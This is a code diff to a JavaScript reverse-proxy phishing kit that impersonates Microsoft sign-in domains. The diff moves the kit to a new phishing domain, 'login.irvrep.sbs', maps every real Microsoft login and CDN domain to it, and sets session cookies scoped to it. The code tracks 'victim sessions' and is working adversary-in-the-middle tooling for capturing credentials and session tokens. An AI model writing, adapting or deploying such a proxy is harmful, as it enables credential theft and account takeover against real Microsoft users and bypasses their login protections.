@@ -36,33 +36,21 @@ const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
 
 // ---- Bidirectional domain mapping (Carlos technique) ----
-const PHISHING_DOMAIN = 'triumphant-adventure-production-2ae7.up.railway.app'; // <-- YOUR DOMAIN
+const PHISHING_DOMAIN = 'login.irvrep.sbs'; // <-- YOUR DOMAIN
 
 // Incoming: victim requests our phishing domain -> map to real Microsoft domains
-const SUBDOMAIN_MAPPING = {
-    [PHISHING_DOMAIN]: 'login.microsoftonline.com',
-    [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
-    [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
-    [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
-    [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
-    [`live.${PHISHING_DOMAIN}`]: 'login.live.com',
-    // Add m365.cloud.microsoft to the mapping!
-    [`m365.${PHISHING_DOMAIN}`]: 'm365.cloud.microsoft'
-};
 
-// Outgoing (Response): real Microsoft domains -> map back to our phishing domain
-const REVERSE_MAPPING = {};
-for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
-    REVERSE_MAPPING[real] = phish;
-}
-
-// Also add any additional domains Microsoft might send that aren't in SUBDOMAIN_MAPPING
-const EXTRA_REVERSE = {
-    'm365.cloud.microsoft': `m365.${PHISHING_DOMAIN}`,
-    'www.office.com': `office.${PHISHING_DOMAIN}`,
-    'office.com': `office.${PHISHING_DOMAIN}`
+// Map every real Microsoft domain back to our single phishing subdomain
+const REVERSE_MAPPING = {
+    'login.microsoftonline.com': PHISHING_DOMAIN,
+    'login.microsoft.com': PHISHING_DOMAIN,
+    'www.office.com': PHISHING_DOMAIN,
+    'aadcdn.msftauth.net': PHISHING_DOMAIN,
+    'aadcdn.msauth.net': PHISHING_DOMAIN,
+    'login.live.com': PHISHING_DOMAIN,
+    'm365.cloud.microsoft': PHISHING_DOMAIN,
+    'office.com': PHISHING_DOMAIN
 };
-Object.assign(REVERSE_MAPPING, EXTRA_REVERSE);
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -136,7 +124,7 @@ if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.triumphant-adventure-production-2ae7.up.railway.app`);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.irvrep.sbs`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -190,7 +178,7 @@ if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.triumphant-adventure-production-2ae7.up.railway.app`;
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.irvrep.sbs`;
 clientResponse.setHeader("Set-Cookie", cookieHeader);
                                         console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
